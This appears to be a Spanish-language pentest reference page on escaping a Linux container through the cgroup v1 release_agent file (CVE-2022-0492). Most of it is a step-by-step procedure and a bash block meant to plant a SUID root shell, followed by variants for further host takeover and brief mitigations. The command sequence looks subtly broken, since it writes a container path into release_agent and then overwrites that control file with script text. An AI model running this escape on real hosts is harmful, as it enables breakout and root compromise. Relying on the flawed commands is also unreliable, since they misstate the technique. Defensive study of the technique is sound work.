---
topic: Escape de contenedor con release_agent
tags: [linux, docker, cgroup, container-escape, privesc]
---

# Escape de contenedor con release_agent

[🌐 English](cgroup-release-agent-escape.en.md) | **Español**

## Concepto

En cgroup v1, el archivo `release_agent` ejecuta un programa en el host cuando un cgroup queda vacío. Si un contenedor tiene `CAP_SYS_ADMIN` y el cgroup está montado con permisos de escritura, puede registrar su propio agente y escapar. CVE-2022-0492 amplía esta superficie en kernels sin la comprobación de capacidades.

## Cuándo aplica

- `capsh --print` muestra `cap_sys_admin`.
- `mount` muestra un cgroup v1 de lectura/escritura.
- El kernel es anterior a la corrección de CVE-2022-0492.

## Procedimiento

1. Verificar la capacidad y el montaje del cgroup.
2. Crear un cgroup hijo y un script que copie `/bin/bash` con SUID.
3. Escribir la ruta en `release_agent` y vaciar el cgroup.
4. Ejecutar el binario desde el host montado o desde el contenedor.

```bash
capsh --print | grep sys_admin
mount | grep cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/tmp/cgrp/release_agent" > /tmp/cgrp/release_agent
printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /tmp/cgrp/release_agent
chmod +x /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
/tmp/rootbash -p
```

## Variantes

- Usar `core_pattern` si `release_agent` no es escribible.
- Montar el sistema de archivos del host y modificar un binario privilegiado.
- Combinar con una clave SSH del host.

## Limitaciones

- cgroup v2 no tiene `release_agent`.
- Sin `CAP_SYS_ADMIN` el montaje falla.
- El kernel parcheado bloquea la escritura.

## Mitigación y detección

- Ejecutar contenedores sin `CAP_SYS_ADMIN`.
- Usar cgroup v2 y user namespaces.
- Actualizar el kernel y monitorizar montajes de cgroup.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2022-0492>
- <https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/>
- <https://attack.mitre.org/techniques/T1611/>
